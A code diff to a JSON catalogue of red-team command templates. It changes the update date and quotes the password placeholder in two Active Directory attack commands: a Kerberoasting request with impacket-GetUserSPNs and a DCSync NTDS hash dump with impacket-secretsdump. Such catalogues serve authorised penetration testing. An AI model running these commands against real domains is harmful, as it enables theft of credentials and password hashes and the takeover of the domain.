@@ -1,7 +1,7 @@
 {
   "version": "1.0",
   "label": "redteam",
-  "updatedDate": "2026.05.06",
+  "updatedDate": "2026.05.07",
   "categories": [
     {
       "id": "redteam-creds",
@@ -332,7 +332,7 @@
           "id": "redteam-ad-003",
           "name": "Kerberoast — GetUserSPNs",
           "description": "Crackable TGS for SPN-bearing users.",
-          "template": "impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {RHOST} -request -outputfile tgs.txt",
+          "template": "impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {RHOST} -request -outputfile tgs.txt",
           "group": "Core Active Directory"
         },
         {
@@ -353,7 +353,7 @@
           "id": "redteam-ad-006",
           "name": "DCSync — secretsdump",
           "description": "Dump NTDS hashes once you have replication rights.",
-          "template": "impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{RHOST} -just-dc",
+          "template": "impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{RHOST} -just-dc",
           "group": "Core Active Directory"
         },
         {
